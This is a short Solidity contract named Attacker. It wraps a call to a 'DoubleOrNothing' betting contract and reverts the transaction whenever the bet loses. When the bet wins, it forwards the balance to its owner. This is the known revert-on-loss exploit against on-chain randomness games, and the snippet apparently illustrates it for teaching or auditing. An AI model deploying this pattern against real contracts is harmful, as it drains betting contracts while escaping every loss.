contract Attacker {
    address private doubleOrNothing  = ...; 
    address private owner = ...;  
    
    function play() payable external {
        IDoubleOrNothing(doubleOrNothing).play{value: msg.value}();
        if (address(this).balance < msg.value) revert;
        owner.call{value: address(this).balance}();  
    }
}


